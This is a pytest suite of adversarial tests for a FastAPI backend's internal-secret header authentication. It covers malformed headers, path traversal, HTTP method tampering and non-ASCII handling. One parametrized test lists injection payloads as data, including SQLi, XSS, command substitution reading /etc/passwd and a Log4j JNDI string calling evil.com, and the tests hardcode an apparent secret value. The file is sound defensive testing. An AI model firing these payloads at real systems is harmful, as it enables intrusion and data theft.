"""Adversarial and stress-test suite for BOB Backend authentication & security (M1).

Challenger 1 empirical verification against backend/main.py and backend/api/routes_health.py:
1. Malformed/invalid headers (missing, empty, whitespace, casing, huge payloads, unicode, injections).
2. Path traversal and unauthorized routing attempts.
3. HTTP method tampering (POST, PUT, DELETE, OPTIONS, PATCH, HEAD).
4. Strict 401 Unauthorized enforcement across the attack surface.
"""

import asyncio
import pytest
from fastapi import HTTPException
from fastapi.testclient import TestClient

from backend.main import create_app, verify_internal_secret
from backend.config import get_settings


@pytest.fixture(scope="module")
def app_instance():
    """Create fresh application instance for adversarial tests."""
    return create_app()


@pytest.fixture(scope="module")
def client(app_instance):
    """TestClient for executing adversarial requests."""
    return TestClient(app_instance)


@pytest.fixture(scope="module")
def valid_secret():
    """Valid configured internal API secret."""
    return get_settings().INTERNAL_API_SECRET


# ==============================================================================
# SECTION 1: HEADER STRESS & MALFORMED PAYLOAD TESTS
# ==============================================================================


def test_adversarial_missing_header_returns_strict_401(client):
    """Missing X-Internal-Secret returns HTTP 401 with standard error detail."""
    resp = client.get("/internal/v1/health")
    assert resp.status_code == 401
    assert resp.json() == {"detail": "Missing or invalid X-Internal-Secret header"}


@pytest.mark.parametrize(
    "empty_val",
    [
        "",
        "   ",
        "\t",
        "\n",
        "\r\n",
        " \t \n \r ",
    ],
    ids=["empty", "spaces", "tab", "newline", "crlf", "mixed_ws"],
)
def test_adversarial_empty_and_whitespace_headers_return_401(client, empty_val):
    """Empty or whitespace-only headers must strictly return 401."""
    resp = client.get("/internal/v1/health", headers={"X-Internal-Secret": empty_val})
    assert resp.status_code == 401
    assert resp.json() == {"detail": "Missing or invalid X-Internal-Secret header"}


@pytest.mark.parametrize(
    "padded_secret",
    [
        " bob_secret_key_alcy_legacy_2026",
        "bob_secret_key_alcy_legacy_2026 ",
        " bob_secret_key_alcy_legacy_2026 ",
        "\tbob_secret_key_alcy_legacy_2026",
        "bob_secret_key_alcy_legacy_2026\n",
    ],
    ids=["lead_space", "trail_space", "surround_space", "lead_tab", "trail_newline"],
)
def test_adversarial_padded_secret_rejected_with_401(client, padded_secret):
    """Secrets with surrounding whitespace/tabs/newlines must not be trimmed and must return 401."""
    resp = client.get("/internal/v1/health", headers={"X-Internal-Secret": padded_secret})
    assert resp.status_code == 401
    assert resp.json() == {"detail": "Missing or invalid X-Internal-Secret header"}


@pytest.mark.parametrize(
    "header_name",
    [
        "X-Internal-Secret",
        "x-internal-secret",
        "X-INTERNAL-SECRET",
        "x-InTeRnAl-SeCrEt",
        "X-internal-SECRET",
    ],
)
def test_adversarial_header_name_casing_behavior(client, valid_secret, header_name):
    """HTTP headers are case-insensitive per RFC 7230/9110: valid secret must succeed regardless of header name casing."""
    resp = client.get("/internal/v1/health", headers={header_name: valid_secret})
    assert resp.status_code == 200
    assert resp.json()["status"] == "ok"


@pytest.mark.parametrize(
    "header_name",
    [
        "X-Internal-Secret",
        "x-internal-secret",
        "X-INTERNAL-SECRET",
    ],
)
def test_adversarial_wrong_secret_with_different_casing_returns_401(client, header_name):
    """Wrong secret with different header name casings must strictly return 401."""
    resp = client.get("/internal/v1/health", headers={header_name: "wrong_secret_val"})
    assert resp.status_code == 401
    assert resp.json() == {"detail": "Missing or invalid X-Internal-Secret header"}


@pytest.mark.parametrize(
    "wrong_secret",
    [
        "bob_secret_key_alcy_legacy_202",      # Missing last char (prefix match)
        "ob_secret_key_alcy_legacy_2026",      # Missing first char (suffix match)
        "BOB_SECRET_KEY_ALCY_LEGACY_2026",      # Uppercase secret value (value is case-sensitive!)
        "bob_secret_key_alcy_legacy_2026_extra", # Appended extra
        "admin",
        "secret",
        "bearer bob_secret_key_alcy_legacy_2026",
    ],
    ids=["prefix_match", "suffix_match", "uppercase_val", "appended_extra", "admin", "secret", "bearer_prefix"],
)
def test_adversarial_invalid_secrets_strict_401(client, wrong_secret):
    """Wrong secrets (including prefix/suffix/case variants) must return 401."""
    resp = client.get("/internal/v1/health", headers={"X-Internal-Secret": wrong_secret})
    assert resp.status_code == 401
    assert resp.json() == {"detail": "Missing or invalid X-Internal-Secret header"}


@pytest.mark.parametrize("payload_size", [10_000, 100_000, 1_000_000], ids=["10kb", "100kb", "1mb"])
def test_adversarial_huge_secret_buffer_overflow_attempt(client, payload_size):
    """Oversized secret strings (10KB to 1MB) must be safely rejected with 401 without crashing or leaking."""
    huge_secret = "A" * payload_size
    resp = client.get("/internal/v1/health", headers={"X-Internal-Secret": huge_secret})
    assert resp.status_code == 401
    assert resp.json() == {"detail": "Missing or invalid X-Internal-Secret header"}


@pytest.mark.parametrize(
    "injection_payload",
    [
        "' OR '1'='1",
        "'; DROP TABLE users; --",
        "<script>alert(1)</script>",
        "$(whoami)",
        "`cat /etc/passwd`",
        "{{7*7}}",
        "${jndi:ldap://evil.com/a}",
        "%s%s%s%n",
        '{"admin": true}',
    ],
    ids=["sqli_or", "sqli_drop", "xss", "cmd_sub", "backticks", "ssti", "log4j", "format_str", "json"],
)
def test_adversarial_injection_payloads(client, injection_payload):
    """Common injection strings (SQLi, XSS, Command Injection, SSTI, Log4j) return 401."""
    resp = client.get("/internal/v1/health", headers={"X-Internal-Secret": injection_payload})
    assert resp.status_code == 401
    assert resp.json() == {"detail": "Missing or invalid X-Internal-Secret header"}


# ==============================================================================
# SECTION 2: PATH TRAVERSAL & ROUTING ADVERSARIAL TESTS
# ==============================================================================


@pytest.mark.parametrize(
    "path",
    [
        "/internal/v1/health/..",
        "/internal/v1/./health",
        "/internal/v1//health",
        "/internal/v1/health/",
    ],
)
def test_adversarial_path_traversal_without_auth_blocked_by_middleware(client, path):
    """Any traversal or normalized path under /internal/v1 without auth must return 401."""
    resp = client.get(path)
    assert resp.status_code == 401
    assert resp.json() == {"detail": "Missing or invalid X-Internal-Secret header"}


@pytest.mark.parametrize(
    "unauthed_subpath",
    [
        "/internal/v1/health",
        "/internal/v1/health/extra",
        "/internal/v1/analyze",
        "/internal/v1/refactor",
        "/internal/v1/nonexistent",
        "/internal/v1/admin",
        "/internal/v1/config",
        "/internal/v1/",
        "/internal/v1",
    ],
)
def test_adversarial_all_internal_v1_subpaths_strictly_require_auth(client, unauthed_subpath):
    """Any request targeting /internal/v1* without auth must return 401 before hitting any router logic."""
    resp = client.get(unauthed_subpath)
    assert resp.status_code == 401
    assert resp.json() == {"detail": "Missing or invalid X-Internal-Secret header"}


def test_adversarial_unregistered_path_returns_404_when_authenticated(client, valid_secret):
    """Authenticated request to non-existent endpoint under /internal/v1 returns 404, not 401 or 500."""
    resp = client.get(
        "/internal/v1/nonexistent_test_route_123",
        headers={"X-Internal-Secret": valid_secret},
    )
    assert resp.status_code == 404


def test_adversarial_root_health_not_exposed_unauthenticated(client):
    """Root /health (outside /internal/v1) is not exposed and must return 404."""
    resp = client.get("/health")
    assert resp.status_code == 404


@pytest.mark.parametrize(
    "case_path",
    [
        "/INTERNAL/v1/health",
        "/Internal/v1/health",
        "/internal/V1/health",
    ],
)
def test_adversarial_case_tampered_paths_do_not_expose_health(client, case_path):
    """Case-tampered paths like /INTERNAL/v1/health must not return 200 without auth."""
    resp = client.get(case_path)
    assert resp.status_code in (401, 404)
    assert resp.status_code != 200


def test_adversarial_duplicate_prefix_route_exists(client, valid_secret):
    """Verify architectural fix: redundant /internal/v1/internal/v1/health route was removed and returns 404."""
    resp = client.get(
        "/internal/v1/internal/v1/health",
        headers={"X-Internal-Secret": valid_secret},
    )
    assert resp.status_code == 404


def test_adversarial_public_documentation_endpoints_exposure(client):
    """Document potential info disclosure: /docs, /redoc, /openapi.json are currently exposed without auth."""
    for doc_path in ["/docs", "/redoc", "/openapi.json"]:
        resp = client.get(doc_path)
        assert resp.status_code == 200


# ==============================================================================
# SECTION 3: HTTP METHOD TAMPERING TESTS
# ==============================================================================


@pytest.mark.parametrize("method", ["post", "put", "delete", "options", "patch", "head"])
def test_adversarial_unauthorized_http_methods_strictly_return_401(client, method):
    """All unauthenticated HTTP methods on /internal/v1/health must strictly return 401."""
    http_method = getattr(client, method)
    resp = http_method("/internal/v1/health")
    assert resp.status_code == 401
    if method != "head":
        assert resp.json() == {"detail": "Missing or invalid X-Internal-Secret header"}


@pytest.mark.parametrize("method", ["post", "put", "delete", "options", "patch", "head"])
def test_adversarial_authenticated_disallowed_methods_return_405(client, valid_secret, method):
    """Authenticated requests with non-GET methods must return 405 Method Not Allowed."""
    http_method = getattr(client, method)
    resp = http_method("/internal/v1/health", headers={"X-Internal-Secret": valid_secret})
    assert resp.status_code == 405


def test_adversarial_authenticated_get_succeeds(client, valid_secret):
    """Authenticated GET /internal/v1/health returns 200 OK."""
    resp = client.get("/internal/v1/health", headers={"X-Internal-Secret": valid_secret})
    assert resp.status_code == 200
    assert resp.json()["status"] == "ok"


# ==============================================================================
# SECTION 4: DIRECT DEPENDENCY UNIT TESTING
# ==============================================================================


@pytest.mark.parametrize(
    "bad_secret",
    [
        None,
        "",
        " ",
        "wrong",
        "bob_secret_key_alcy_legacy_202",
        "A" * 1000,
    ],
    ids=["none", "empty", "space", "wrong", "prefix", "large_ascii"],
)
def test_verify_internal_secret_dependency_adversarial(bad_secret):
    """verify_internal_secret dependency strictly raises 401 HTTPException on invalid ASCII inputs."""
    with pytest.raises(HTTPException) as exc_info:
        verify_internal_secret(bad_secret)
    assert exc_info.value.status_code == 401
    assert exc_info.value.detail == "Missing or invalid X-Internal-Secret header"


def test_verify_internal_secret_dependency_valid_returns_exact_secret(valid_secret):
    """verify_internal_secret dependency returns valid secret string."""
    assert verify_internal_secret(valid_secret) == valid_secret


# ==============================================================================
# SECTION 5: NON-ASCII SECURITY HARDENING (TYPEERROR REMEDIATION)
# ==============================================================================


def test_vulnerability_secrets_compare_digest_raises_typeerror_on_non_ascii():
    """Verify remediation: secrets.compare_digest with UTF-8 encoding handles non-ASCII strings without TypeError.

    When non-ASCII input is passed to verify_internal_secret, it safely raises HTTPException(401)
    instead of an unhandled TypeError.
    """
    with pytest.raises(HTTPException) as exc_info:
        verify_internal_secret("bób_sécrèt")
    assert exc_info.value.status_code == 401
    assert exc_info.value.detail == "Missing or invalid X-Internal-Secret header"


def test_vulnerability_asgi_raw_non_ascii_header_crashes_middleware(app_instance):
    """Verify remediation: Latin-1/non-ASCII byte header in HTTP/1.1 is safely handled and returns 401.

    In HTTP/1.1, bytes 0x80-0xFF can be sent on the wire and are decoded by ASGI via Latin-1.
    Because backend/main.py encodes secrets to UTF-8 before comparing digests,
    the server cleanly returns HTTP 401 rather than crashing with an unhandled TypeError.
    """
    scope = {
        "type": "http",
        "http_version": "1.1",
        "method": "GET",
        "path": "/internal/v1/health",
        "raw_path": b"/internal/v1/health",
        "query_string": b"",
        "headers": [
            (b"host", b"testserver"),
            (b"x-internal-secret", "bób_secret".encode("latin-1")),
        ],
    }
    responses = []

    async def send(message):
        responses.append(message)

    async def receive():
        return {"type": "http.request"}

    asyncio.run(app_instance(scope, receive, send))

    assert len(responses) >= 2
    assert responses[0]["type"] == "http.response.start"
    assert responses[0]["status"] == 401
